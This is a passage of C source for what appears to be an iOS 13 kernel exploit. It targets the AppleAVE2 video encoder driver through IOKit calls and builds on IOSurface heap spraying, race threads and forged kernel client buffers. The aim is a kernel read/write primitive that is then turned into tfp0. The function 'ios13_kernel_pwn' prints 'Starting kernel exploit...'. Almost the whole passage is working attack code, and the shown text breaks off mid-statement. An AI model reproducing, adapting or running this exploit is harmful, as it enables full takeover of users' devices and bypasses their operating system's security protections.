    debugPrint("  AVE AddClient kr: 0x%x(%d) clientid:0x%x|0x%x\n", kr, kr, output_stru[0], output_stru[1]);
    if(kr){
        errorPrint("%s", "client full\n");
        return 1;
    }
    return 0;
}

static void remove_client(){
    size_t input_stru_size = 0x4;
    uint32_t unused1 = 0;
    size_t output_stru_size = 0x4;
    uint32_t unused2 = 0;
    IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 1, &unused1, input_stru_size, &unused2, &output_stru_size);
    // Neither output_stru or kr has used for indicates any sign of success or failure
}

static void encode_client_normal(uint8_t isFor_finalCleaning){
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    
    *(uint8_t*)(inputmap_InitInfo + 13377) = 0;
    if(isFor_finalCleaning)
        *(uint32_t*)(inputmap_InitInfo + 4) = 0;
    else
        *(uint32_t*)(inputmap_InitInfo + 4) = 0x333;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 2;
    
    {
        char *input_stru = calloc(1, 0x110);
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
    }
}

static void spray_client(){
    
    *(uint64_t*)(inputmap_InitInfo + 1072) = 0;
    
    pthread_t p3 = NULL;
    pthread_create(&p3, &pth_commAttr, (void*)race_kmem2, NULL);
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 2020) = 0xB0F0-31;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 0x990-31;
    *(uint32_t*)(inputmap_InitInfo + 4) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4567;
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
    
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    *(uint32_t*)(inputmap_InitInfo + 96) = 39;
    *(uint32_t*)(inputmap_InitInfo + 1936) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 13292) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13388) = 5;
    
    char input_stru[0x110] = {0};
    *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId; // FrameQueue
    *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId; // InitInfo
    
    *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId; // ParameterSetsBuffer
    
    *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId; // mbComplexityMapBuffer
    
    *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId; // statsMapBuffer[0]
    *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId; // statsMapBuffer[1]
    *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId; // statsMapBuffer[2]
    *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId; // statsMapBuffer[3]
    *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId; // statsMapBuffer[4]
    
    *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId; // codedOutputBuffer[0]
    *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId; // codedOutputBuffer[1]
    *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId; // codedOutputBuffer[2]
    *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId; // codedOutputBuffer[3]
    *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId; // codedOutputBuffer[4]
    
    *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId; // xCodeOutputBuffer[0]
    *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId; // xCodeOutputBuffer[1]
    
    *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId; // codedHeaderBuffer [0] *Must Specify
    *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId; // codedHeaderBuffer [1] *Must Specify
    *(uint32_t*)(input_stru + 220) = InitInfo_surfaceId; // codedHeaderBuffer [2]
    *(uint32_t*)(input_stru + 224) = InitInfo_surfaceId; // codedHeaderBuffer [3]
    *(uint32_t*)(input_stru + 228) = InitInfo_surfaceId; // codedHeaderBuffer [4]
    
    *(uint32_t*)(input_stru + 232) = InitInfo_surfaceId; // sliceHeaderBuffer[0]
    *(uint32_t*)(input_stru + 236) = InitInfo_surfaceId; // sliceHeaderBuffer[1]
    *(uint32_t*)(input_stru + 240) = InitInfo_surfaceId; // sliceHeaderBuffer[2]
    *(uint32_t*)(input_stru + 244) = InitInfo_surfaceId; // sliceHeaderBuffer[3]
    *(uint32_t*)(input_stru + 248) = InitInfo_surfaceId; // sliceHeaderBuffer[4]
    
    *(uint32_t*)(input_stru + 48) = InitInfo_surfaceId; // userDPBBuffer[0][0] ioSurface
    *(uint32_t*)(input_stru + 52) = InitInfo_surfaceId; // userDPBBuffer[0][1] ioSurface
    *(uint32_t*)(input_stru + 56) = InitInfo_surfaceId; // userDPBBuffer[1][0] ioSurface
    *(uint32_t*)(input_stru + 60) = InitInfo_surfaceId; // userDPBBuffer[1][1] ioSurface
    *(uint32_t*)(input_stru + 64) = InitInfo_surfaceId; // userDPBBuffer[2][0] ioSurface
    *(uint32_t*)(input_stru + 68) = InitInfo_surfaceId; // userDPBBuffer[2][1] ioSurface
    *(uint32_t*)(input_stru + 72) = InitInfo_surfaceId; // userDPBBuffer[3][0] ioSurface
    *(uint32_t*)(input_stru + 76) = InitInfo_surfaceId; // userDPBBuffer[3][1] ioSurface
    *(uint32_t*)(input_stru + 80) = InitInfo_surfaceId; // userDPBBuffer[4][0] ioSurface
    *(uint32_t*)(input_stru + 84) = InitInfo_surfaceId; // userDPBBuffer[4][1] ioSurface
    *(uint32_t*)(input_stru + 88) = InitInfo_surfaceId; // userDPBBuffer[5][0] ioSurface
    *(uint32_t*)(input_stru + 92) = InitInfo_surfaceId; // userDPBBuffer[5][1] ioSurface
    *(uint32_t*)(input_stru + 96) = InitInfo_surfaceId; // userDPBBuffer[6][0] ioSurface
    *(uint32_t*)(input_stru + 100) = InitInfo_surfaceId; // userDPBBuffer[6][1] ioSurface
    *(uint32_t*)(input_stru + 104) = InitInfo_surfaceId; // userDPBBuffer[7][0] ioSurface
    *(uint32_t*)(input_stru + 108) = InitInfo_surfaceId; // userDPBBuffer[7][1] ioSurface
    *(uint32_t*)(input_stru + 112) = InitInfo_surfaceId; // userDPBBuffer[8][0] ioSurface
    *(uint32_t*)(input_stru + 116) = InitInfo_surfaceId; // userDPBBuffer[8][1] ioSurface
    *(uint32_t*)(input_stru + 120) = InitInfo_surfaceId; // userDPBBuffer[9][0] ioSurface
    *(uint32_t*)(input_stru + 124) = InitInfo_surfaceId; // userDPBBuffer[9][1] ioSurface
    *(uint32_t*)(input_stru + 128) = InitInfo_surfaceId; // userDPBBuffer[10][0] ioSurface
    *(uint32_t*)(input_stru + 132) = InitInfo_surfaceId; // userDPBBuffer[10][1] ioSurface
    *(uint32_t*)(input_stru + 136) = InitInfo_surfaceId; // userDPBBuffer[11][0] ioSurface
    *(uint32_t*)(input_stru + 140) = InitInfo_surfaceId; // userDPBBuffer[11][1] ioSurface
    *(uint32_t*)(input_stru + 144) = InitInfo_surfaceId; // userDPBBuffer[12][0] ioSurface
    *(uint32_t*)(input_stru + 148) = InitInfo_surfaceId; // userDPBBuffer[12][1] ioSurface
    *(uint32_t*)(input_stru + 152) = InitInfo_surfaceId; // userDPBBuffer[13][0] ioSurface
    *(uint32_t*)(input_stru + 156) = InitInfo_surfaceId; // userDPBBuffer[13][1] ioSurface
    *(uint32_t*)(input_stru + 160) = InitInfo_surfaceId; // userDPBBuffer[14][0] ioSurface
    *(uint32_t*)(input_stru + 164) = InitInfo_surfaceId; // userDPBBuffer[14][1] ioSurface
    *(uint32_t*)(input_stru + 168) = InitInfo_surfaceId; // userDPBBuffer[15][0] ioSurface
    *(uint32_t*)(input_stru + 172) = InitInfo_surfaceId; // userDPBBuffer[15][1] ioSurface
    *(uint32_t*)(input_stru + 176) = InitInfo_surfaceId; // userDPBBuffer[16][0] ioSurface
    *(uint32_t*)(input_stru + 180) = InitInfo_surfaceId; // userDPBBuffer[16][1] ioSurface
    
    *(uint8_t*)(input_stru + 256) = 1;
    *(uint64_t*)(input_stru + 264) = 0x2222222222222222;
    
    size_t output_stru_size = 4;
    char output_stru[4] = {0};
    
    IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
}

/*static uint64_t find_proc_byPID(pid_t target_pid) {
    
    uint64_t found_proc = KernelRead_8bytes(allproc_kAddr);
    while(1){
        // this loop start from the most recent new proc
        if(!found_proc)
            break;
        
        pid_t pid_i = KernelRead_4bytes(found_proc + OFFSET_bsd_info_pid);
        
        if(target_pid == pid_i)
            break;
        
        found_proc = KernelRead_8bytes(found_proc);
    }
    return found_proc;
}*/

struct paveway_sprayAddrs_pack{
    uint64_t *paveway_sprayAddrs;
    uint32_t paveway_sprayCnt;
};
static struct paveway_sprayAddrs_pack *_pack_paveway = 0;
static uint32_t _pack_pavewayCnt = 0;

static uint64_t hohoo(){
    // LGB at Texas Instrument!
    uint64_t conti_seqno[2] = {0};
    uint64_t *paveway_sprayAddrs = calloc(1, 300 * 8); // 300 is default storage unit count of paveway_sprayAddrs
    uint32_t paveway_sprayCnt = 0;
    while(1){
        uint64_t new_addr = alloc_kernel_40_mem();
        paveway_sprayAddrs[paveway_sprayCnt] = new_addr;
        paveway_sprayCnt ++;
        
        for(int j=0; j<paveway_sprayCnt; j++){
            uint64_t stored_addr = paveway_sprayAddrs[j];
            if((new_addr + 0x30) == stored_addr){
                // If mem right after new_addr is known previously sprayed
                
                if(!conti_seqno[0]){
                    conti_seqno[0] = new_addr;
                } else if(!conti_seqno[1]){
                    if((conti_seqno[0] != stored_addr) && (conti_seqno[0] != (new_addr - 0x30))){
                        // Avoid store an address that is near prev stored conti_seqno[0] address
                        conti_seqno[1] = new_addr;
                    }
                }
            }
            else if((new_addr - 0x30) == stored_addr){
                // If mem right after new_addr is known previously sprayed
                
                if(!conti_seqno[0]){
                    conti_seqno[0] = stored_addr;
                } else if(!conti_seqno[1]){
                    if((conti_seqno[0] != new_addr) && (conti_seqno[0] != (stored_addr - 0x30))){
                        // Avoid store an address that is near prev stored conti_seqno[0] address
                        conti_seqno[1] = stored_addr;
                    }
                }
            }
        }
        
        if(conti_seqno[1]){
            // Collect enough conti memory spray, paveway stage completed.
            break;
        }
        
        if(!(paveway_sprayCnt % 300)){
            // paveway_sprayAddrs is full, expanding the buf size
            paveway_sprayAddrs = realloc(paveway_sprayAddrs, 8 * (paveway_sprayCnt + 300));
        }
    }
    
    for(int i=0; i<paveway_sprayCnt; i++){
        if(paveway_sprayAddrs[i]){
            if((paveway_sprayAddrs[i] == conti_seqno[0]) || (paveway_sprayAddrs[i] == conti_seqno[1])){
                paveway_sprayAddrs[i] = 0;
            }
        }
    }
    
    if(_pack_paveway == NULL){
        _pack_paveway = calloc(1, 10 * sizeof(struct paveway_sprayAddrs_pack)); // 10 is default storage unit count of paveway_sprayAddrs_pack
        _pack_pavewayCnt = 0;
    }
    
    _pack_paveway[_pack_pavewayCnt].paveway_sprayAddrs = paveway_sprayAddrs;
    _pack_paveway[_pack_pavewayCnt].paveway_sprayCnt = paveway_sprayCnt;
    _pack_pavewayCnt ++;
    
    if(!(_pack_pavewayCnt % 10)){
        // _pack_paveway is full, expanding the buf size
        _pack_paveway = realloc(_pack_paveway, sizeof(struct paveway_sprayAddrs_pack) * (_pack_pavewayCnt + 10));
    }
    
    debugPrint("conti_seqno[0]: 0x%llx\n", conti_seqno[0]);
    debugPrint("conti_seqno[1]: 0x%llx\n", conti_seqno[1]);
    
    uint64_t real_spray[3] = {0};
    real_spray[0] = conti_seqno[0];
    real_spray[1] = alloc_kernel_40_mem();
    real_spray[2] = conti_seqno[1];
    
    release_kernel_40_mem(real_spray[0]);
    release_kernel_40_mem(real_spray[1]);
    release_kernel_40_mem(real_spray[2]);
    
    debugPrint("%s","real_spray:\n");
    debugPrint("  0: 0x%llx\n", real_spray[0]);
    debugPrint("  1: 0x%llx\n", real_spray[1]);
    debugPrint("  2: 0x%llx\n", real_spray[2]);
    
    uint32_t criticle_index = 10;
    
    TT1_send_spray();
    
    uint64_t criticle_records[10] = {0};
    uint64_t leaked_osdata = 0;
    for(int i=0; i<150; i++){
        uint64_t live_40buf = alloc_kernel_40_mem();
        if(i<criticle_index){
            criticle_records[i] = live_40buf;
        }
        
        if(i == criticle_index){
            // Interfering spray process while hopefully tend to begin showing stable output, so the desired address can stood-out
            TT1_send_spray();
            
            if(criticle_records[0] == criticle_records[2]){
                TT1_sprayid = TT1_sprayid - 1;
                leaked_osdata = real_spray[0];
            }
            else if(real_spray[2] == criticle_records[2]){
                if(real_spray[2] == criticle_records[8]){
                    leaked_osdata = real_spray[2];
                }
            }
            else{
                errorPrint("%s","NOTHING!!!!\n");
                //printf2("========== RE-Attemp ====\n");
                release_kernel_40_mem(live_40buf);
                leaked_osdata = hohoo();
                return leaked_osdata;
            }
        }
        
        if(i > criticle_index){
            if(leaked_osdata && leaked_osdata == live_40buf){
                // Target address been taken again, indicating was failure attempt, leaked_osdata is a false result
                errorPrint("**** 0x%llx Target address been taken again, indicating that was failure attempt.. reattemping...\n", live_40buf);
                leaked_osdata = 0;
                i = 0;
            }
        }
        
        debugPrint("spraymap: 0x%llx\n", live_40buf);
        release_kernel_40_mem(live_40buf);
    }
    
    return leaked_osdata;
}

static uint32_t TT1_hit_holes[TT1_holes_count] = {0};
static uint32_t TT1_hit_cnt = 0;

static void hohoo222(){
    bzero(TT1_hit_holes, sizeof(TT1_hit_holes));
    TT1_hit_cnt = 0;
    
    uint64_t leaked_osdata = 0;
    while(1){
        leaked_osdata = hohoo();
        if(leaked_osdata)
            break;
    }
    
    TT2_send_spray();
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD701);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD751);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD7A1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD7F1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD841);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD891);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD8E1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD931);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD9D1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDA21);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDA71);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDAC1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDB11);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDB61);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDBB1);
    
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = leaked_osdata + 0x18;
    alloc_kernel_40_mem_contains_iosurfacebuf();
    empty_kernel_40_mem(leaked_osdata + 0x20);
    
    uint32_t confirm_TT1_sprayid = 0;
    uint8_t failure_case_all7 = 0;
    char *ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid);
    ccc = ccc + 0x10;
    confirm_TT1_sprayid = TT1_sprayid;
    for(int i=0; i<TT1_holes_count; i++){
        char *aaa = ccc + 0x80*i;
        
        if(i == 0){
            kObject_AppleAVE2Driver = *(uint64_t*)(aaa+0x10);
            kObject_IOSurface = *(uint64_t*)(aaa+0x20);
        }
        
        debugPrint("aaa: 0x%x 0x%x\n", *(uint32_t*)(aaa+0x10), *(uint32_t*)(aaa+0x18));
        if(*(uint32_t*)(aaa+0x10) == 0x77777777){
            failure_case_all7 = 1;
            break;
        }
        if(*(uint32_t*)(aaa+0x10) == 0x66666666){
            uint32_t id = *(uint32_t*)(aaa+0x18);
            TT1_hit_holes[TT1_hit_cnt] = id;
            TT1_hit_cnt++;
            
        }
    }
    
    if(failure_case_all7 || (TT1_hit_cnt == 0)){
        failure_case_all7 = 0;
        confirm_TT1_sprayid = TT1_sprayid + 1;
        char *ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid + 1);
        ccc = ccc + 0x10;
        for(int i=0; i<TT1_holes_count; i++){
            char *aaa = ccc + 0x80*i;
            
            if(i == 0){
                kObject_AppleAVE2Driver = *(uint64_t*)(aaa+0x10);
                kObject_IOSurface = *(uint64_t*)(aaa+0x20);
            }
            
            if(*(uint32_t*)(aaa+0x10) == 0x77777777){
                debugPrint("aaa(+1): 0x%x 0x%x\n", *(uint32_t*)(aaa+0x10), *(uint32_t*)(aaa+0x18));
                failure_case_all7 = 1;
                break;
            }
            if(*(uint32_t*)(aaa+0x10) == 0x66666666){
                uint32_t id = *(uint32_t*)(aaa+0x18);
                TT1_hit_holes[TT1_hit_cnt] = id;
                TT1_hit_cnt++;
            }
        }
        
        if(failure_case_all7 || (TT1_hit_cnt == 0))
        {
            failure_case_all7 = 0;
            confirm_TT1_sprayid = TT1_sprayid - 1;
            ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid - 1);
            ccc = ccc + 0x10;
            for(int i=0; i<TT1_holes_count; i++){
                char *aaa = ccc + 0x80*i;
                
                if(i == 0){
                    kObject_AppleAVE2Driver = *(uint64_t*)(aaa+0x10);
                    kObject_IOSurface = *(uint64_t*)(aaa+0x20);
                }
                
                if(*(uint32_t*)(aaa+0x10) == 0x77777777){
                    debugPrint("aaa(-1): 0x%x 0x%x\n", *(uint32_t*)(aaa+0x10), *(uint32_t*)(aaa+0x18));
                    failure_case_all7 = 1;
                    break;
                }
                if(*(uint32_t*)(aaa+0x10) == 0x66666666){
                    uint32_t id = *(uint32_t*)(aaa+0x18);
                    TT1_hit_holes[TT1_hit_cnt] = id;
                    TT1_hit_cnt++;
                }
            }
        }
    }
    
    if(failure_case_all7 || (TT1_hit_cnt == 0)){
        errorPrint("%s","----(EMB) fallL!\n");
        hohoo222();
        return;
    }
    
    TT1_sprayid = confirm_TT1_sprayid;
}


static void clean_up_everything(){
    for(int i=0; i<6; i++){
        remove_client();
    }
}


static void prep_redirect_prev_clientbuf(uint64_t new_prev_clientbuf){
    for(int i=0; i<3; i++){
        *(uint64_t*)(inputmap_InitInfo + 147228) = new_prev_clientbuf; // 0x4000
        *(uint64_t*)(inputmap_InitInfo + 130844) = new_prev_clientbuf; // 0x8000
        *(uint64_t*)(inputmap_InitInfo + 114460) = new_prev_clientbuf; // 0xc000
    }
}

static void prep_fake_clientbuf(uint64_t genuine_UserClient_kobj){
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    uint64_t forge_clientbuf_kaddr = magic_addr + 0x24000;
    bzero(forge_clientbuf, 0x29B98);
    
    *(uint64_t*)(forge_clientbuf + 0x0) = genuine_UserClient_kobj;
    *(forge_clientbuf + 0x27B58) = 0x1;
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    uint64_t forge_KernelFrameQueue_kaddr = forge_clientbuf_kaddr + 0x29B98;
    bzero(forge_KernelFrameQueue, 24);
    *(uint64_t*)(forge_clientbuf + 0x27818) = forge_KernelFrameQueue_kaddr;
    
    char *forge_inputmap_FrameInfo = forge_KernelFrameQueue + 24;
    uint64_t forge_inputmap_FrameInfo_kaddr = forge_KernelFrameQueue_kaddr + 24;
    *(uint64_t*)(forge_KernelFrameQueue + 0x10) = forge_inputmap_FrameInfo_kaddr;
    
    *(uint32_t*)(forge_clientbuf + 0x8) = 0x0;
    *(forge_clientbuf + 0x27B59) = 0x0;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 16) = 0x4569;
    *(uint32_t*)(forge_clientbuf + 0x4FF0 + 112) = 0x1;
    *(uint64_t*)(forge_clientbuf + 0x27838) = forge_inputmap_FrameInfo_kaddr + 0x2A000;
    *(uint64_t*)(forge_inputmap_FrameInfo + 5936) = 0;
}

static void clean_fake_clientbuf(){
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    bzero(forge_clientbuf, 0x29B98);
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    bzero(forge_KernelFrameQueue, 24);
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

#pragma mark ---- Research Purpose ---- Install tfp0-persis program

static uint64_t find_port(mach_port_t port){
    uint64_t itkSpace = KernelRead_8bytes(our_task_kAddr + OFFSET_task_itk_space);
    uint64_t isTable = KernelRead_8bytes(itkSpace + OFFSET_ipc_space_is_table);
    
    uint32_t portIdx = port >> 8;
    uint32_t ipcEntrySz = 0x18;
    uint64_t portAddr = KernelRead_8bytes(isTable + (portIdx * ipcEntrySz));
    return portAddr;
}

#pragma mark ---- exp ---- Convert R/W prim to TFP0

void ios13_kernel_pwn(io_connect_t ioconn, io_connect_t surface_ioconn){
    printf("Starting kernel exploit...\n");
    
    
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
    
    uint64_t InitInfo_map_addr = 0, InitInfo_map_size = 0;
    InitInfo_surfaceId = IOSurfaceRootUserClient_create_surface_map(surface_ioconn, &InitInfo_map_addr, (uint32_t*)&InitInfo_map_size);
    
    if(!InitInfo_surfaceId){
        errorPrint("%s","exp failed!\n");
        exit(1);
    }
    
    printf("InitInfo_surfaceId: 0x%x\n", InitInfo_surfaceId);
    Init_spraydata_for_TT1(InitInfo_surfaceId);
    Init_spraydata_for_TT2(InitInfo_surfaceId);
    
    uint64_t *remap_local_addr = 0;
    Send_overwritting_iosurfaceMap(InitInfo_map_addr, (uint64_t *)&remap_local_addr);
    
    inputmap_InitInfo = (char*)remap_local_addr;
    
    if(setjmp(reattempt_jmpb)){
        errorPrint("%s","RRRReatrmpe 9afioasf..\n");
        clean_up_everything();
    }
    
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    *(uint8_t*)(inputmap_InitInfo + 13377) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    
    {
        char input_stru[0x110] = {0};
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 220) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 224) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 228) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 232) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 236) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 240) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 244) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 248) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 48) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 52) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 56) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 60) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 64) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 68) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 72) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 76) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 80) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 84) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 88) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 92) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 96) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 100) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 104) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 108) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 112) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 116) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 120) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 124) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 128) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 132) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 136) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 140) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 144) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 148) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 152) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 156) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 160) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 164) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 168) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 172) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 176) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 180) = InitInfo_surfaceId;
        
        size_t output_stru_size = 4;
        char output_stru[4] = {0};
        for(int i=0; i<80; i++){
            IOConnectCallStructMethod(ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
        }
    }
    
    hohoo222();
    
    TT2_send_spray_smallspray(); // seal up remaining hols
    for(int i=0; i<TT1_hit_cnt; i++){
        uint32_t id = TT1_hit_holes[i];
        debugPrint("hit holes id: 0x%x\n", id);
        IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, id);
    }
    
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    uint64_t spareone = alloc_kernel_40_mem_contains_iosurfacebuf();
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = spareone;
    remove_client();
    
    spray_client();
    char *ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid);
    ccc = ccc + 0x10;
    for(int i=0; i<TT1_holes_count; i++){
        char *aaa = ccc + 0x80*i;
        
        if(((*(uint64_t*)(aaa+0x10) == 0) || (*(uint64_t*)(aaa+0x10) == kObject_AppleAVE2Driver)) && (*(uint64_t*)(aaa+0x20) == kObject_IOSurface)){
